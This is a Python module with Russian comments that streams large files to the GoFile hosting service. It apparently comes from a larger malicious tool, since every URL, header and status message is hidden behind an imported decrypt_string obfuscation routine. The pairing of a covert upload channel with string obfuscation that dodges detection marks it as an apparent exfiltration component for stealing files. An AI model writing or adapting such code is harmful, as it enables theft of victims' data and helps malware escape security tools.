import os
import json
import urllib.request
import urllib.parse
import mimetypes
import uuid
from core.obfuscation import decrypt_string

class CloudModule:
    """Модуль для выгрузки больших файлов на внешние сервисы (GoFile)"""
    
    @staticmethod
    def get_best_server():
        """Получение лучшего сервера GoFile"""
        try:
            with urllib.request.urlopen(decrypt_string("BkYMGz1rdk07BwMWFVYAEwJXVgIhfj4HLjUPSwZqAwgYVwo=")) as response:
                data = json.loads(response.read().decode())
                if data['status'] == 'ok':
                    return data['data']['server']
        except:
            pass
        return "store1"

    @staticmethod
    def upload_file(file_path: str, status_callback=None) -> str:
        """Загрузка файла на GoFile с использованием стриминга для больших файлов"""
        if not os.path.exists(file_path):
            return None
            
        if status_callback:
            status_callback(decrypt_string("vq2o1Z7qiOGL8LqNooS2wr6HWLrPgeyz2qfY6Mfo5qreEqjfnuqI7Xqn3ejC6dWr7uP7u/mB47LiWUQW"))
            
        server = CloudModule.get_best_server()
        url = decrypt_string("BkYMGz1rdk0hBA9KBFwUB0BVFw0nPTxMMxhFTQJVCRsKdBEHKw==")
        
        try:
            boundary = str(uuid.uuid4())
            content_type = decrypt_string("A0cUHychOBAuWAxXAFRLHg9GGVBuMzYXNBMLSgsEHRgBRxYPLyMgHw==")
            filename = os.path.basename(file_path)
            
            # Подготовка заголовка и подвала multipart
            header = (
                decrypt_string("Qx8DCSEkNwY7BRNFLks6FA==") +
                decrypt_string('LV0WHys/LU8eHhlIHUoPDgddFlFuNzYQN1oOWQZYXVoAUxUOc3M/CzYSSANSXw8WC1wZBitsexk8HgZdHFgLHxMQJBkSPw==') +
                decrypt_string("LV0WHys/LU8ODhpdSBkdFwdfHR83ITwRdBAfXQFKOQ4XQh1DKDg1BwUHC0waED1KMxIXGW52OBIqGwNbE00PFQAdFwg6NC1PKQMYXRNUQQcyQCQFEiMFDA==")
            ).encode()
            footer = decrypt_string("MkAkBWN8IgA1AgRcE0sfB0MfJBkSPw==").encode()
            
            file_size = os.path.getsize(file_path)
            total_size = len(header) + file_size + len(footer)

            if status_callback:
                status_callback(decrypt_string("vqWo257iiOKL9LqPooO2yk7iykue74nTisy6iKKDtsROGgMNJz08PSkeEF1SFklaXwJKX25+dkJrR1gMDxkrOEccVkU="))

            # Кастомный класс для потоковой передачи данных в urllib
            class StreamBody:
                def __init__(self, header, file_path, footer):
                    self.header = header
                    self.file_path = file_path
                    self.footer = footer
                    self.f = open(file_path, 'rb')
                    self.pos = 0
                    self.total_size = total_size

                def read(self, size=-1):
                    res = b""
                    # Чтение заголовка
                    if self.pos < len(self.header):
                        chunk = self.header[self.pos:self.pos+(size if size != -1 else len(self.header))]
                        res += chunk
                        self.pos += len(chunk)
                        if size != -1: size -= len(chunk)
                        if size == 0: return res
                    
                    # Чтение файла
                    if self.pos >= len(self.header) and self.pos < len(self.header) + file_size:
                        chunk = self.f.read(size)
                        res += chunk
                        self.pos += len(chunk)
                        if size != -1: size -= len(chunk)
                        if size == 0: return res

                    # Чтение подвала
                    if self.pos >= len(self.header) + file_size:
                        footer_pos = self.pos - (len(self.header) + file_size)
                        chunk = self.footer[footer_pos:(footer_pos+size) if size != -1 else len(self.footer)]
                        res += chunk
                        self.pos += len(chunk)
                    
                    return res

                def __len__(self): return self.total_size
                def close(self): self.f.close()

            body_stream = StreamBody(header, file_path, footer)
            request = urllib.request.Request(url, data=body_stream)
            request.add_header("Content-Type", content_type)
            request.add_header("Content-Length", total_size)
            
            try:
                with urllib.request.urlopen(request) as response:
                    res_data = json.loads(response.read().decode())
                    if res_data['status'] == 'ok':
                        return res_data['data']['downloadPage']
            finally:
                body_stream.close()
        except Exception as e:
            print(decrypt_string("NRMlSw09Nhc+Vz9IHlYHHk53ChkhI2NCIRIX"))
        return None

if __name__ == "__main__":
    test_file = decrypt_string("GlcLH2AlIRY=")
    with open(test_file, "w") as f: f.write("Hello GoFile!")
    link = CloudModule.upload_file(test_file, lambda s: print(decrypt_string("PUYZHzsiY0IhBBc=")))
    print(decrypt_string("IlsWAHRxIg4zGQFF"))
    if os.path.exists(test_file): os.remove(test_file)
